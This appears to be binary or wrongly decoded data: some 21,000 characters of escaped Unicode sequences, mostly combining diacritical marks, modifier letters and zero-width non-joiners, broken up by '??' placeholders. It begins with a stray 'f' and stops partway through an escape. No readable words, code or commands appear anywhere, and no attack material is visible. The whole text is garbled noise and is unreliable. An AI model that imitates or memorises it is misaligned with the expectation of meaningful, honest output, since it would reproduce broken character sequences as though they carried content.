f\u030a\u02d6\u02d6\u02f2\u030a\u0300??\u0310\u02ff??\u0305????\u02ea\u0316\u02f5\u0316\u02e6\u0313\u02d5\u0315\u0313\u0311\u02d3\u0317\u0312??\u02d5??\u02e8\u02f8\u030d\u02f8\u02d7\u02d3\u02e5\u02d2??\u02d6??\u02df\u0314\u02f5\u030b\u0302\u02d4\u02f5\u02eb??\u02f7\u02f5\u030b\u0302\u030a\u030d\u0315\u02f3\u02d3\u0316??\u02d6\u02e8\u02f0\u0309\u0301??\u02d4????\u02ed\u02f8??\u0314\u02f8\u02e6\u02ff\u0304????\u02ff\u0311\u02f4\u030c\u02eb\u02e6\u02df\u0300??\u02d2\u0303\u0318\u02ff\u02d7\u030e\u0305\u0301??\u030e\u02e5\u030a\u0316\u02d3\u02d2??\u030d\u02ed\u02ff\u0311\u02d5\u0315\u02e7\u0316\u030a\u02f0\u02eb\u02f6\u02df\u02d5??\u02f1\u030f\u030b\u0308\u02eb\u0309\u02f6\u02d6\u0317\u02f0\u02f4\u02e5??\u0316\u02e6\u02d3\u02e5\u0304????\u02d7\u0305\u0302\u030f\u030d??\u02e9\u030e??\u02eb\u030d\u0313\u030a????\u0300??\u0307\u02f6\u02ea????\u0302\u02df\u02e5\u02d4\u0303??\u02f1??\u0302\u02d6\u02e8\u0301\u02d3\u02d5\u0315\u0308\u02d4\u02ff??\u02d6\u02f4\u0314\u02d3\u0312\u0313\u0305\u02e7\u02f3??????\u02d7??\u02d4\u02eb\u030c\u0314\u030b\u02e6\u02f0??\u02d4??\u0303\u02f5??\u02d6\u02d2\u02e7\u02e5\u02d3\u0306\u0300\u02f5\u0310\u02f8??\u02f0\u02d2\u02ef??\u02ed\u02d5\u0304\u0316\u02ef\u0316\u02d3\u0309\u02d4\u02ff\u02ea??\u030c\u02e8\u02eb\u030e\u0300????\u02e6\u0304\u0303\u02f5\u030f\u02d2??\u02e5\u0315\u02f6\u02ea??\u030f\u02f7????\u02ed\u02d4\u030c\u02eb????\u02df??\u02ed\u02e7\u02ff\u0315\u0308\u02ff\u0305????\u0306??\u02ff\u02ff\u02d3\u0305\u0304\u02f8\u02f8??\u02d7\u02ed??\u0307\u02d2\u02f0??\u0315\u0313??\u02f5\u02d3\u02e9\u030f\u0305\u0310\u0312\u02f1\u02d2??\u0314\u02f4\u0316\u0313\u0307\u02d2\u02d4\u02f8\u0318\u02ff\u0302\u0303\u0313\u0312\u0303\u0302\u02ef??\u02f8\u02f2\u0304\u02e9\u0317??\u0312\u02f1\u02f5\u02d4\u0301??\u030d\u02e8\u02ef\u030c\u02e6\u02eb\u0303\u02eb\u02e5\u02e7\u02ef\u02d2\u02e7\u030c????\u0302??\u02f3??\u0318\u02ea\u0310\u02d2\u02d4\u0318\u0300\u0315\u0312??????\u030c\u02f5\u02f4\u02f3\u0311??\u0308\u0300\u030c\u0306\u0300\u0300\u0302\u02ea\u02e5\u02ef\u0307\u02e6\u02e7\u02ef\u0310??\u0318\u02d5\u02e9\u02f4\u0301??\u030e\u0302\u0313\u02f4\u0317\u02ea????\u0312????\u0318\u0307\u02e8\u02e8\u0303\u02ea??\u0307\u02d6\u0302??\u0307\u0303??\u02ed??\u0311??\u02d3\u030a\u02e5\u0301\u0310??\u02e9\u0313\u02eb\u02e6??\u030f??\u0308\u030d\u030b\u0300\u02f2\u030c??\u02e6\u02ed??\u02df??\u0308??\u02df??\u02f3\u02f0\u030f??\u030a\u02ea??\u030d\u0300????\u0312\u02e6\u02ff\u0314\u02f1\u0310\u0315\u0306\u02f2\u030a??\u0303\u02f3\u02e9\u0313\u0307\u0305\u02f8??????\u02f0??\u02d4??\u02f4????\u0301??\u0312??\u02f7??\u0310\u0315\u0312\u0307\u0305\u0301\u0308\u0316????\u030a\u02e5\u0303\u02f6\u02d3??\u0303\u0318\u02df??\u02d6\u02f8\u02d2??\u030b\u02f3??\u02f6\u02e9??\u02e9\u0304\u0313\u0314??\u0306\u0314\u030f\u02f3\u02f3\u030e??\u02ef\u02d4\u0305\u02d7\u030d\u02ef\u0305\u0312\u0317\u030e\u02d7\u0310\u02ff????\u0314\u02d2??\u0313\u02e6\u0301\u0310\u0313\u02e6\u030a\u0313\u0300\u030c\u030c????\u0309\u0302\u02df??\u0308\u0302??\u02eb\u0317\u02d4\u02f6\u02f6??\u030c\u030e\u0301\u02e8\u0314\u0316\u02d2\u030b\u0306\u02ed\u02ed\u02e5????\u030a\u0309????\u02e7\u02f8\u0313??\u030e\u0303\u02e7\u0306\u0310\u02ef??\u02f0\u030d\u02f0\u02f1\u02f5\u0312\u0309??\u02f1\u02d6\u02e5\u02f2\u02d5\u0306\u0315??\u0315????\u0302????\u0301\u02f1\u02d6\u02ff\u030a????????\u0318\u02f3??\u02f4\u02f2??\u02f4\u0301\u02f7\u0307??\u02d7\u0305\u02e6????\u02d4\u030d\u02d3??\u02ef\u02f6\u02ff\u0314??\u030b\u02e7????????\u02ea\u02f8\u02e9\u02f4\u02ea??\u02f7\u02ed\u02eb\u02e8\u0314\u0305\u0309\u02f6\u0312\u0308????\u0306????\u02f0\u02eb??\u02e8??\u030e??\u0308\u0315\u02f6\u02f7\u030e\u02f3\u02e5????\u0312??????\u0302??\u02f0\u0305??\u02f8????\u0312\u0302\u02f8\u0302\u0310\u0312??\u0307\u0301\u0316\u02e5\u0316\u030c\u02f4??\u02d2\u02f2\u0307\u030e\u02d7\u02e5\u02ff\u0301\u0301\u02e7\u0302\u02f1\u02ef\u0318\u02df\u02d5\u0305\u02f8\u02e5????\u0313\u02df??\u02eb\u0303\u0312\u0307\u0315\u0307\u02f6\u0312\u02f0\u02d7\u02e9\u02ed\u0311\u02f4????\u02f5\u02e8??\u0305\u02f4\u02d6\u030e\u02f8????\u030f\u02d4\u02d4\u02d2????\u02e9????\u02eb\u02f0\u0308??\u0315\u02e7\u0308\u0318\u02f3??\u030b\u0303\u02d3????\u02e9\u02d6\u02ef\u02f1??\u02e8????\u02e9\u0307\u0316\u02f3??\u030b\u0304\u02d6\u030a??\u02f7\u0308\u02ff\u0302??\u02eb\u0303\u0304\u02f3??\u0318\u02d3\u02d2\u0314\u030b\u0306\u0313??\u030b??\u02e8??\u02e8\u0317\u02f4\u0307\u030e??\u0313\u02e8\u0304??\u02df??\u02e6\u02f1\u030b??\u02f1\u030b\u02f0\u0314\u0309\u0303\u02d6\u02f1\u02f5\u0313\u0301\u02f7\u0310\u02ff\u02d6\u02f6????\u0313\u02d7??\u0312??\u02e9\u0316??\u02f1????\u0311\u0316\u02d2??\u0317\u02ea\u02d6\u0303\u02f7\u0311\u02f2\u0318\u02d3\u030f\u02ea\u02d5\u02d6??\u02e7\u0300\u02e7????\u02d7??\u02e8\u0303\u02f8??\u0317\u0311\u02df\u02e5\u0318\u02f4??\u02d2\u02f7??\u0309\u0318\u0307\u02f0\u02df\u02e5\u030f??\u0308\u0315??\u030f\u0316\u030e\u030e??\u02d5\u02f4\u02e8\u0303\u0302??\u0300\u02f0\u02f6\u02d5??\u02e9\u030e??\u02e6??\u02f0\u02f2\u0315\u02f7\u0313??\u02f1\u02f8\u030b\u030b\u02f4????\u0305\u02e5\u030a\u02e7??\u0304\u02d2??\u02ff\u0303??\u02d4\u02e8\u02eb\u0306\u0316\u0318\u030a\u02f6\u0307\u0312\u02ff\u0309\u0304\u0305????\u0318\u02d2\u02df\u030d??\u0317??\u030b\u02e8\u02d6\u02ed??\u0305\u0308\u0316\u0310\u02f3\u02ef\u0301\u02ff\u0302\u030c\u0300\u02d4\u02d2\u02ef\u0306\u02ea??\u0312\u02df\u02ed\u02ed\u030b\u030c\u02f8\u02ff\u0306\u030b\u0314\u0314??\u0311\u02e8??\u02d6\u0309\u0310\u02f1\u02eb\u0317\u030f\u0305\u02f4??\u0318\u030b??\u030e\u02ff\u0308\u02eb\u02d7\u030b\u02ed\u0314\u0300\u0305??????\u0311\u02d4\u02ff\u0316\u02e8\u0310\u02ed\u030b\u030b\u02d4\u02e5\u030b\u02e9??\u030d\u030d\u02df\u02ed\u02d3??\u030e\u0313??\u030d\u02ef\u030b\u0311??\u02f8\u0302??\u0306\u0312\u02ed\u0312\u02ea\u02d5\u0301\u030a\u0312\u0317\u02d4??\u02d3\u02e8\u02ef\u0311\u0312\u030a??\u02eb\u02d7\u02e7????\u0313\u030d\u02f5\u0310\u0300\u030d\u02df\u0303\u0308\u0304\u02d4\u02f3??\u02d5\u02f7\u0305\u0304\u0317\u02f8??\u02e7\u030c\u02d6\u02df\u02f0\u0304\u02f0\u0301\u02e7\u030c\u02d3\u02df\u02f0??\u030e\u02e8\u02e5??\u02e7\u200c????\u02e8\u02f2\u02f1\u0309\u02e7??\u200c????\u200c??\u200c??\u200c??\u02df\u0315\u200c??\u02df????\u02eb\u0307\u02d2\u0315\u02ea\u0308\u02f3\u0315??\u0318\u02e7??\u200c??\u200c??\u200c??\u02ef\u02df\u02ff\u200c??\u200c????\u02ef\u02e5\u200c??\u02df\u0308\u0304\u0305\u200c??\u02f6\u02df\u0301\u200c??\u02ed\u02ef??\u200c??\u02df\u0308\u02f3??\u02f0\u0317\u02ff\u02f5\u02d3\u030c\u0301\u0315\u200c??\u200c????\u02df??\u02ef\u200c????\u200c??\u200c??????\u02e6\u02f4\u02f3\u030a??\u200c??\u200c??\u02f3\u02df??\u200c??\u02df\u0315??\u200c??\u02df\u0308\u02ef\u030b\u0316\u0314\u02f7\u0305\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02e7\u200c??\u02df\u030e\u02f6\u030a\u02ef\u02e7\u030d??\u02f0\u02d2\u200c??\u02df??\u02d4\u02df\u02f2\u02eb\u02df??\u0305\u200c??\u02df\u02ef\u200c??\u02df??\u200c??\u200c??\u02df\u02ea\u200c??\u200c????\u200c??\u200c????\u030d\u200c??\u200c??\u02e7\u200c??\u200c??\u02eb\u200c??\u200c??\u02df??\u200c??\u200c????\u200c??\u200c????\u200c??\u200c??\u02df\u02f3\u200c??\u200c????\u200c??\u200c??\u02df\u02ef\u200c??\u200c??\u02ef\u200c??\u200c????\u200c??\u200c????\u02ef\u200c??\u200c??\u030d\u200c??\u200c????\u200c??\u200c??\u200c??\u02df??\u200c????\u200c??\u200c??\u200c??\u02df\u02f7\u02df\u02f4\u0315\u02df\u0307\u200c??\u02f7\u02df\u02f6\u02df??\u0310\u200c??\u02f7\u02df\u030b\u0315\u02df\u0307\u200c??\u02f7\u02df\u030d\u02ef\u02df\u0307\u200c??\u02f7\u02df\u0316\u0305\u02df\u0307\u200c??\u02f7\u02df??\u02ef??\u0301\u200c??\u02f7\u02df\u02d3\u0305??\u0301\u200c??\u02f7\u02df??\u02ef\u02df\u0307\u200c??\u030d\u02df??\u0305\u02df\u02e8\u02df\u02ef\u030d\u02df\u02e6\u0315??\u02e8\u02df\u02ef\u02f7\u02df\u02ea\u0315??\u0307\u200c??\u02f7\u02df\u02f3\u0305??\u0300\u02df\u02ef\u02f7\u02df\u0304\u02ef\u02e5\u02e8\u02df\u02ef\u02d2\u02df\u030c\u02df??\u030e\u200c??\u02f7\u02df\u030d\u0305\u02e5\u02e8\u02df\u02ef\u02d2\u02df\u0310\u02df??\u030e\u200c??\u02d2\u02df\u0311\u0305??\u030e\u200c??\u02f7\u02df\u0313\u02ef\u02e5\u02e8\u02df\u02ef\u02f7\u02df\u0316\u02ef??\u0307\u200c??\u02f7\u02df??\u02df??\u0307\u200c??\u02f7\u02df??\u0305??\u02e9\u02df\u0305\u02f7\u02df\u02e5\u0315\u02e7\u0309\u02df\u0305\u02f7\u02df\u02f4\u0315\u02e7\u0309\u02df\u0305\u02f7\u02df\u0301\u02df\u02e7\u0307\u02df??\u02e7\u02df\u0302\u0305\u02e7\u02d2\u02df??\u02e7\u02df\u0308\u02ef\u02e7\u02d2\u200c??\u02f7\u02df\u030a\u0305\u02e7\u0307\u200c??\u02f7\u02df\u02d3\u02ef\u02e7\u0307\u200c??\u02f7\u02df\u02e5\u0305\u02eb\u0306\u02df\u0315\u02f7\u02df\u02f1\u02df\u02eb\u0307\u200c??\u02f7\u02df\u02f4\u0305??\u0309\u02df\u0315\u02f7\u02df\u0305\u02ef\u02eb\u0307\u200c??\u02f7\u02df\u0307\u02df??\u0300\u02df\u02ef\u02f7\u02df\u02d6\u02df??\u02d4\u02df\u0315\u02f7\u02df\u02eb\u02df\u02ef\u0307\u200c??\u02f7\u02df\u030a\u02df\u02f0\u0310\u200c??\u02f7\u02df\u0312\u02df\u02f0\u0310\u200c??\u02f7\u02df??\u0305\u02ef\u0309\u02df\u0305\u02f7\u02df\u02d4\u02ef\u02ef\u0309\u02df\u0305\u02f7\u02df??\u0305\u02f3\u0309\u02df\u0305\u02f7\u02df\u02e8\u02ef\u02f3\u0309\u02df\u0305\u02f7\u02df??\u0305\u02f3\u0309\u02df\u0305\u02f7\u02df\u02f4\u0315\u02f3\u0309\u02df\u0305\u02f7\u02df\u0301\u0305\u02f3\u0309\u02df\u0305\u02f7\u02df\u0308\u02ef\u02f6\u02d4\u02df\u0315\u02f7\u02df\u030d\u02ef\u02f6\u02d4\u02df\u0315\u02f7\u02df\u0310\u0315\u02f3\u0309\u02df\u0305\u02f7\u02df\u0318\u02df\u02f4\u0310\u200c??\u02df??\u200c????\u02ed\u200c??\u200c??\u200c??\u02df??\u200c????\u200c??\u02ef\u02df\u02ef\u02df\u02ea\u0311\u02df\u0315\u200c??\u02f4\u200c????\u200c??\u0305\u02df\u02ef\u02df\u02ef\u200c????\u0305\u02ea\u02f0\u02df\u02e6??\u200c??\u0315\u02df\u02e7\u200c??\u02df??\u200c????\u0314\u02df\u0312??\u02df??\u02ef\u02df??\u200c??\u0305\u02df??\u02df??\u200c????\u030d????\u02ef??\u0316\u200c??\u02f3\u02df??\u200c??\u200c??\u02ef\u200c??\u02df\u02ef\u02eb\u200c????\u02f3\u02df??\u02ef\u02df\u02e7\u200c??\u02f3??\u200c??\u02df\u02d6\u02df\u0315\u200c????\u02ef\u02df??\u200c??\u030d\u02df??\u0315??\u200c????\u02f3??\u200c????\u0316\u200c??\u0309\u02df??\u0305\u02df??\u02df\u02ef\u200c??\u02e9\u02ef\u02ef\u200c????\u02f3\u02df??\u02ef\u02df\u02f1\u200c??\u02f3??\u200c????\u02ed??\u200c??\u02df??\u02ef\u02df\u02e8\u02df??\u02ef\u200c??\u02df??\u200c????\u02df??\u200c??\u02df\u02f4\u200c??\u0309\u02df??\u0315\u02df\u02f2\u02df\u0301??\u02df\u02e6\u0315\u02df\u02f2\u02df????\u02df\u02e7\u0315\u02df\u02f2\u02df\u0304\u02f7??\u02e8\u0315??\u02f2\u02df??\u02f7??\u02e7\u0315\u02df\u0316\u02df??\u02df??\u02f5\u0305??\u0316\u02df??\u0305??\u02f5\u0305??\u0316\u200c??????\u02f5\u0305??\u02f2\u02df\u02f3\u02ef??\u02f6\u0305??\u02ef\u02e7\u200c??\u200c??\u02df??\u02f0\u02e5\u02ea\u02ef\u02df\u02e5\u0315\u02df??\u02df\u02e7\u0305\u0305\u200c??\u200c??\u02df\u02e8\u02f7\u02df\u02ef\u0315??\u0301\u200c????\u02df\u0316??\u02e7\u200c??\u200c??\u02df\u030a\u0305??\u0313\u02df\u02f7??\u200c??\u0305??\u0315\u02e8\u200c??\u200c??\u02df??\u02f0\u02df??\u02f7??\u0318\u0315\u02df??\u02df\u02ea\u02ef\u030b\u200c??\u200c??\u02df\u02e8\u02f7\u02df\u02ef\u02df\u02ea\u0316\u200c??\u02ef\u02df\u02f4??\u0301\u200c??\u200c??\u02df\u030a\u0305??\u030c\u02df\u0307\u02df????\u0305??\u0309\u02e9\u200c??\u200c??\u02df??\u02e5\u02e5??\u02eb\u02df\u02f5\u200c??\u02e8\u02df\u02ea\u02ef\u030d\u200c??\u200c??\u02df??\u02eb\u02df\u0318\u02ef\u02df??\u02df\u02ef\u0309\u02df\u02d2??\u0309\u200c??\u200c??\u02df??\u0315\u02df\u02d2\u02df??\u02eb????\u02ef??\u0305\u02e9\u0305\u200c??\u200c??\u02df\u02f2\u02df??\u02f7??\u0308\u0305??\u02e8\u200c??\u0305\u0312\u200c??\u200c??\u02df??\u02eb\u02df??\u02ef??\u0307\u02df\u02ef\u0309\u02df??????\u200c??\u200c??\u02df??\u0315????\u02df\u02eb\u02eb????\u02ef\u02df\u0309\u02ea\u0315\u200c??\u200c??\u02df\u02f2\u02df??\u02f7????\u0305??\u02e8\u02df\u02ea\u02ef\u0315\u200c??\u200c??\u02df??\u02eb\u02df??\u02df????\u02df\u02ef\u0309\u02df\u0314????\u200c??\u200c??\u02df??\u0315??\u0314\u02df\u0306\u0305????\u02ef??\u02e7\u02eb\u0305\u200c??\u200c??\u02df\u02f2\u02df??\u02d2????\u02df\u02e7\u02e8\u02df\u02e9\u0315\u0318\u200c??\u200c??\u02df\u02e8??\u02f7\u0312\u200c??\u0300\u200c??\u0309\u02df\u0314??\u02ef\u200c??\u200c??\u02df??\u0315??\u02f0\u02df??\u0311????\u02ef??\u02df??\u02ef\u200c??\u200c??\u02df\u02f2\u02df\u02eb??\u02df\u0302\u02ef\u02e7\u02e8\u02df\u02ea\u0305??\u200c??\u200c??\u02df??\u02eb\u02df\u0318\u02ef??\u02f0\u02df\u0305\u0309\u02df\u030b??\u0301\u200c??\u200c??\u02df??\u0315????\u02df\u030f\u0311????\u02ef??\u030d\u02ed\u200c??\u200c??\u200c??\u02f2\u02df??\u0305??\u0312\u02ef\u02e7\u02e8\u02df\u02eb\u02ef\u02d3\u200c??\u200c??\u02df??\u02eb\u02df\u02ed\u02df??\u02eb\u02df\u0305\u0309\u02df\u0316??\u030d\u200c??\u200c??\u02df??\u0315??\u02f0\u02df\u02ed\u02df????\u02ef??\u02df\u02ed\u0315\u200c??\u200c??\u02df\u02f2\u02df\u02eb??\u02df\u02d5\u02df\u02e7\u02e8\u02df??\u02df\u02d6\u200c??\u200c??\u02df??\u02eb\u02df\u02e8\u02ef\u02ef\u02e7\u02df\u0315\u0309\u200c??\u200c????\u02df??\u0305??\u200c??\u02df??\u02df\u02e6\u02e7??\u200c??\u02df??\u02df\u02e6\u02f7??\u200c??\u02df??\u02df??\u02ef??\u200c??\u02df??\u02df??????\u200c??\u02df??\u02df\u02ea\u02f7??\u200c??\u02df??\u02df\u02eb\u02ef??\u200c??\u02df??\u02df????????\u02ef??\u02ea\u02df??\u02eb\u02df\u02ed\u02ef??\u0318\u02df??\u02e7\u02df\u02f1\u02ef??\u0318\u02df??\u200c??\u02f5\u02ef\u02df\u02d5\u02df\u02f4\u0305\u02df\u02e5\u02ef??\u030c\u02df\u02f6\u02d6\u02df\u0303\u02ef??\u0318\u02df??\u0305\u02df\u030b\u02ef??\u02e9\u02df\u0301??\u02df\u0303\u02ef??\u0313\u02df\u0301\u0305\u02df\u030f\u02ef??\u0318\u02df\u02ed\u02f3\u02df\u030f\u02ef\u02df??\u02df\u0313\u0315\u02df\u0317\u02ef????\u02df\u0306??????\u02ef??\u0307\u02df\u0306\u0311??\u02e9\u02ef??\u0318\u02df??\u0305\u02df\u0305\u02ef\u02df??\u02df\u0318\u030d??\u0305\u02ef\u02df??\u02df\u0318\u030d??\u02d4\u02ef\u02df\u0317\u02df\u0316\u0311????\u02ef\u02e6\u0318\u02df??\u0305\u02df??\u02ef\u02e5\u02f5\u02df\u02d2\u02eb??\u02e9\u02ef??\u0302\u02df\u02d2\u030d??\u02df\u02ef\u02e5\u030b\u02df\u0318\u030d??\u0301\u02ef??\u0316\u02df\u02d5\u030d??\u0301\u02ef??\u02d4\u02df\u02d7\u030d??\u0301\u02ef??\u200c??\u02d7\u030d??\u0301\u02ef??\u02e5\u02df\u02d7\u030d??\u0303\u02ef??\u02eb\u02df??\u0301??\u0311\u02ef??\u0304\u02df\u0316\u02eb??\u0311\u02ef\u02df\u02f8????????\u02e5\u02ef??\u02d7????\u02ef??\u02f7\u02ef??????\u02e5\u02d6??\u02f7\u02ef??\u02f4??\u02e7\u0315??\u0301\u02ef??\u0304??\u02e9\u02eb??\u02eb\u02ef??\u0312??\u02eb\u02ef??\u0307\u02ef??\u0317????\u0309??\u0303\u02ef??\u02d5????\u030d??\u02df\u02ef\u02e5????\u02df\u02e7??\u02e7\u02ef\u02e6\u0318\u02df??\u02eb??\u02e9\u02ef\u02e6\u0318\u02df??\u0305\u02df\u02eb\u02ef\u02e6\u0318\u02df??\u02df??\u02ed\u02ef\u02e6\u0318\u02df??\u02df??\u02ef\u02ef\u02e6\u0318\u02df??\u02df??\u02f1\u02ef\u02e6\u0318\u02df??\u02df??\u02f3\u02ef\u02e6\u0318\u02df??\u02df??\u02f5\u02ef\u02e6\u0318\u02df??\u02df??\u02f7\u02ef\u02e6\u0318\u02df??\u02df??\u02ff\u02ef\u02e6\u0318\u02df\u02eb\u0311??\u0301\u02ef\u02e6\u0318\u02df??\u02df??\u0303\u02ef\u02e6\u0318\u02df??\u02df??\u0305\u02ef\u02e6\u0318\u02df??\u0305\u02df\u02ea\u0305??\u0310\u02df\u02f7\u02f3??\u02ea\u0305??\u0308\u02df\u02f7\u02f3??\u02ea\u0305??\u0300\u02df\u0300\u02eb??\u02ea\u0305????\u02df\u02ef\u0301??\u02ea\u0305??\u02d5\u02df\u0304\u030d??\u02ea\u0305??\u0318\u02df\u0302\u02df??\u02ea\u0305??\u02f2\u02df\u02ff\u02ef??\u02ea\u0305\u02df\u0318\u02df\u02f3\u02f3??\u02ea\u0305\u02df\u0310\u02df\u02f1????\u02ea\u0305\u02df\u0308\u02df\u02f0\u0305??\u02ea\u0305??\u02ea\u02df\u02f7\u0311??\u02ea\u0305????\u02df\u02f7\u02f3??\u02ea\u0305\u02df\u02d5\u02df\u02f5\u02ef??\u02df\u0305??\u0309??\u200c??\u200c??\u0315\u02df??\u02df??\u0305??\u200c??\u02df??\u200c????\u02df\u02f0\u0305\u200c??\u200c??\u0305\u02df\u02e8\u0315??\u0308\u02df\u02e8\u02f3\u02df??\u0305??\u02d2\u02df??\u0311??\u02f0\u0315??\u0307\u02df\u02f8\u0301??\u030f\u0315\u02e6\u02ed\u02df\u0303\u0301????\u0305\u02e7\u0304\u02df\u0308????\u02f0\u0315\u02e8\u0309\u02df\u030d????\u030b\u02df\u02ea??\u02df\u0309\u0305\u02df??\u0315??\u02d7\u02df\u02f7\u02df??\u02d7\u02df\u02e6\u0301??\u02ef\u200c??\u02df\u02ef??\u02df\u02ef\u0305\u200c??\u02df\u0315\u02df\u02f7\u02f0\u0305\u200c????\u200c????\u0305\u200c??\u200c??\u02ef\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df??\u200c??\u200c??\u02df\u0305\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u02ef\u02df\u02f8\u200c??\u200c??\u200c??\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df??\u02df??\u02e7\u200c??\u200c??\u200c??\u02df\u02e7\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u030d\u02df\u02e9\u02ef\u200c??\u200c??\u200c????\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df??\u0305\u02df\u02d2\u200c??\u200c??\u200c??\u02df\u02e6\u200c??\u02f7\u02df??\u200c??\u02e6\u200c??\u0309\u02df??\u0305\u02df\u02e9\u200c??\u0309\u200c??\u200c??\u200c??????\u02df\u0308\u02df\u02ef\u200c??\u200c??\u02df??\u0315??\u02eb??\u200c??\u200c??\u200c??\u0302\u02df\u02e7\u0315??\u02df\u02ef\u200c??\u02df????\u02df\u0309\u02df\u02ef\u200c??\u200c??\u02df\u02e8\u0315??\u02eb??\u02df??\u200c??\u200c??\u030c\u02df\u02e8\u02df??\u200c??\u200c??\u02df????\u02df\u0308\u02df\u02ef??\u200c??\u200c??\u02ea\u02ef??\u02ef??\u200c??\u200c??\u200c??\u0314\u02df\u02e7\u0315??\u200c??\u200c??\u02df????\u02df\u0308\u02df\u02ef\u200c??\u200c??\u02df\u02eb\u0315??\u02eb??\u200c??\u200c??\u200c????\u02df\u02e7\u0315??\u02df\u02ef\u200c??\u02df??\u02f3\u02df\u0309\u02df\u02ef\u0313\u02df??\u0311\u02df\u02e8\u0305????\u02df??\u02f7\u02df\u0303\u0315\u02df\u02ea\u02df\u02e7\u0309\u02df??\u02df??\u0310\u02df??\u200c??\u0311\u200c??\u0317\u02df\u02ea\u02f3\u02df\u02e6\u02df??\u02d4\u02df??\u02ef\u02df\u02d2\u200c??\u0311\u200c??\u0315??\u02df\u02ef????\u200c??\u02e7\u02df\u0305\u02ef\u02df??\u02df????\u02df??\u02df??\u02e8\u200c??\u02f3\u02df\u0305\u02ef\u02df\u02e5\u02df????\u02df??\u0315????\u200c??\u0305\u02df??\u02ef\u02df\u02e8\u02df??\u0309\u02df??\u0305????\u200c??\u0311\u02df??\u02ef\u02df\u02eb\u02df\u02e7??\u02df??\u02ef????\u200c??????\u0302\u02f5\u02d3\u030e\u02f8\u030c\u02f3\u0313\u02f4\u02f3\u0309\u0313\u02f8\u02e5\u0316\u0311\u02df??\u02e8??\u0300\u030b\u030a\u030b\u0302\u02f1\u02d3\u02f4\u02f1\u02ef??\u0312\u0301????\u0314\u0301\u030b\u0316\u030e\u02f7\u0305??\u02f2\u0303\u02f6????\u02f8\u02f5??\u02df\u02f3??\u030a\u0318\u0302\u02e5\u02f4\u0312\u02ea\u0309\u02f0\u0317\u02f7\u02f6\u0302\u030e\u0300\u030b\u0301\u02df\u02f2\u02f5\u030a\u0308\u0301\u030b\u02d7\u0318\u0300??\u02f8??\u02ea\u030a\u02f8\u030e\u0301??\u02f4\u0306\u0300??\u02e8\u0306\u0301??\u030a\u0308\u02df??\u0316??\u0300??\u02f0??\u0300\u02e5\u02f3??\u02df????\u030d\u02f7\u02f6\u02e7\u02df\u02f3\u030c\u02f4\u0313\u0302\u02e5\u030a\u0312\u02f8\u02f3\u0306\u030a\u0300\u02e6??\u030a\u0301\u030c\u02eb\u02df\u02f3??\u030a\u0318\u0302\u02e5\u02f4\u0312\u02ea\u030a\u02e8??\u0300\u030c\u02f0\u030e\u0300\u02f5\u02f3\u0313\u02ef??\u02d7\u0312\u0301\u02e5\u030a\u0311\u02f8\u02f6\u02e8\u02f2\u02f8\u02f6\u02e8??\u02ff\u02f5??\u030a\u0301\u0315??\u02e8\u0300\u030b\u030a??\u02ff\u02f5??\u0311\u02ff\u02f6\u030e\u030a\u02ef\u02f6\u02e8\u0317\u02f7\u02f6\u0309\u02df\u02ef\u02f6\u02e8\u0317\u02f7\u02f6\u0309\u02df\u02f3\u030c\u02f4\u0313\u0302\u02e5\u030a\u0312\u02f8\u02f3\u02f8\u030e\u02f8\u02f5\u0316\u0309\u02f1\u02e5??\u0313\u02f8\u02e5\u0316\u030a\u02df??\u02d3\u0308\u02f7??\u02f0\u0314\u0301\u0305????\u02f8\u02f6\u02f0\u0306\u02df????\u0311\u0301\u02e5\u0306\u0306\u02df??\u02d7\u0307\u02ff\u030b\u02f4\u0308\u0302\u02df??\u0306\u0305\u030f??\u02df\u02d2\u02f7\u02e9\u0305\u02df??????\u0301\u030b\u02f4\u0306\u0300\u02ef??\u02f2\u0303\u02f6????\u02f8\u02f5??\u0313\u02f1\u02f3\u02d6\u02df\u02f2\u02f5\u02f4\u0312\u0300??\u02e8\u02d3\u02f3??\u02f0\u0317\u02f8\u02f5??\u0312\u02df??\u02d3\u0308\u0302\u02e5\u02d7\u0317\u02df??\u02e8\u02d3\u0302\u02e5\u02f3\u02df\u02f0??\u030e\u030e\u0301??????\u0301\u030b\u02f4\u0306\u0300\u02ef??\u02f2\u0303\u02f6????\u02f8\u02f5??\u0313\u02f1\u02f3\u02d6\u0313\u02ef??\u02d7\u0312\u0301\u02e6\u02e8\u030a\u0301????\u030e\u0300??\u02d2\u02df\u02ef??\u02d7\u0312\u0301\u02e6\u02e8\u030a\u0301????\u030e\u0300??\u02d3??\u0300??\u02f0\u030a\u02df??\u030a??\u02ff\u02f6??\u0315\u0300????\u0306\u02f7\u030b\u0316\u030a\u02df??\u02f0\u030e\u0301????\u0314\u0301??\u02f3\u02df\u02f0\u02e6\u02e8\u0306\u0302\u0315??\u030a\u030e\u02e9\u0304\u030b\u0312\u0300\u0304\u0308\u0305\u030e\u02e7\u02df\u02f0\u02f5\u02d3\u0308\u0300??\u02f0\u030e\u0300\u030b\u0301\u02df\u02f3??\u030a\u0318\u0302\u02e5\u02f4\u0312\u02ea\u030a\u02f0\u030a\u0303\u02e6\u02ef\u02df\u02f3\u030b\u02f4\u0318\u02ff\u02f6\u030e\u030a\u02df????\u030a\u0300\u0305??\u0308\u0305\u030d\u0311\u02df\u02d4\u0300\u0303\u02d3\u02d2\u02d2\u02e5\u0314\u02df??\u030a??\u0300\u030c\u02f4\u0312\u02f8\u02f6\u02e8\u0306\u02f7\u030b\u0316\u030a\u02df????\u02d3\u0301??\u02f0\u030a\u0300\u02f1\u02d3??\u0300??\u0316\u0311\u02f8\u02f5????\u02ff\u02f5\u02d7\u0313\u0301\u0315????\u0300??\u0316\u0314\u0301\u0305????\u0301\u030c\u02e8\u0306\u0303\u02f3\u0316\u030e\u0301??\u02ef\u02df\u02f1\u02f5??\u0306\u02f8??\u02f3\u02df\u02ef\u030b\u030a??\u0300\u02f5??\u0315\u02df??\u030a??\u0300??\u0316\u0311\u02f8\u02f5????\u02ff\u02f5\u02d7\u0313\u02df??\u02f0\u02d3\u0301\u02e5\u02f3\u02df\u02f0??\u02f4??\u02f4\u02e6\u030a\u0315\u02f8\u02f3\u02f8\u0317\u0300????\u02e7\u02f7\u02f5\u02d3\u0309\u0300\u02e5\u02f3\u02df\u02f3\u030c\u02f4\u